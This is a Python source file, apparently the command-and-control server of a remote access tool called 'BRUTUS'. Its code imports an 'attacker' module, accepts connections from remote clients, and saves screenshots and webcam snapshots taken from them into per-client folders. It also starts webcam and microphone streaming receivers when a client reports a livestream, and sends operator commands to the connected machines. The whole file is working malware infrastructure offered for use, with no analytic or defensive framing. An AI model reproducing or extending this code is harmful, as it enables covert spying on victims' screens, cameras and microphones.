import socket
import sys
import os
import threading
import asyncore
import requests
import json

import locator
import Command
from attacker.util import *

""" constants """
VERSION = "BRUTUS V. 1.0 Beta"
CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
HOST = socket.gethostname()
PORT = 8080

""" globals """
ip = ""
connections = {}
window = None
video_thread = None

# Terminal wrapper providing the small API Command objects expect.
class TerminalWindow:
    class OutputList:
        def addItem(self, text: str):
            # Print updates from background threads; keep original newline style.
            print(text)

        def clear(self):
            # Clear terminal screen (ANSI); fallback to printing separators if not supported.
            try:
                # ANSI clear screen
                print("\033[H\033[J", end="")
            except Exception:
                print("\n" * 5)

    class InputHelper:
        def clear(self):
            # No-op for terminal; kept for API compatibility.
            pass

    def __init__(self):
        self.Output = TerminalWindow.OutputList()
        self.Input = TerminalWindow.InputHelper()

    def hide(self):
        # Graceful exit when GUI would have closed.
        print("Exiting...")
        sys.exit(0)


""" Class for handling asynchronous TCP-connections """
class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, window, iD):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1

    def video_stream():
        os.system("python webcam-host.py")

    def audio_stream():
        os.system("python microphone-host.py")

    def handle_read(self):
        global video_thread

        if ConnectionHandler.receiving_snapshot:
            data = self.recv(609600)
            image_name = f"snapshot_NUM{self.snapshot_number}.png"

            if not f"webcam{self.id}" in os.listdir():
                os.mkdir(f"webcam{self.id}")

            with open(f"webcam{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_snapshot = False

        elif ConnectionHandler.receiving_screenshot:
            data = self.recv(609600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"

            if not f"screenshots{self.id}" in os.listdir():
                os.mkdir(f"screenshots{self.id}")

            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_screenshot = False

        else:
            data = self.recv(8096).decode("Cp1252")
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                # Print received text with timestamp; Command objects expect window.Output.addItem.
                self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        self.close()
        connections.pop(self.id, None)
        self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        self.close()
        connections.pop(self.id, None)
        self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))


""" Asynchronous Server class """
class Server(asyncore.dispatcher):

    client_number = 0

    def __init__(self, host, port, window):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.window = window
        self.listen(5)

    def handle_accepted(self, sock, addr):
        self.window.Output.addItem(CONN_CONNECT_TEMPLATE.format(time=ts(), addr=addr))
        Server.client_number += 1
        connection = ConnectionHandler(sock, self.window, Server.client_number)
        connections[Server.client_number] = connection


def start_server_in_background(window):
    try:
        server = Server(HOST, PORT, window)
        print("Server running!")
        t = threading.Thread(target=asyncore.loop, kwargs={"timeout":1}, daemon=True)
        t.start()
    except Exception as e:
        # English-only comment: log server startup failure but continue to run the terminal
        print(f"Failed to start server: {e}")


def main():
    global ip, window
    window = TerminalWindow()

    # try to obtain public IP; non-fatal
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=15)
        content = r.content.decode("Cp1252")
        content = json.loads(content)
        ip = content.get("ip", "")
    except Exception:
        # English-only comment: log failure to retrieve public IP and continue
        print("Could not retrieve public IP!")

    # Prepare context for command handlers and render header using Command objects
    context = {
        "connections": connections,
        "ip": ip,
        "locator": locator,
        "version": VERSION,
    }

    # Use the OO command subsystem to show the header (delegates clearing and printing)
    Command.dispatch("clear", window, context)

    # Start server in background
    start_server_in_background(window)

    # Main terminal input loop (runs in main thread)
    try:
        while True:
            try:
                command = input("> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("")  # newline for cleanliness
                break

            if not command:
                continue

            # update context each loop in case connections/ip change
            context.update({
                "connections": connections,
                "ip": ip,
            })

            handled = Command.dispatch(command, window, context)
            if not handled:
                window.Output.addItem(UNKNOWN_COMMAND_TEMPLATE.format(command=command))
    finally:
        print("Shutting down.")
        # best-effort close connections
        try:
            for c in list(connections.values()):
                try:
                    c.close()
                except Exception:
                    pass
        except Exception:
            pass


if __name__ == "__main__":
    main()
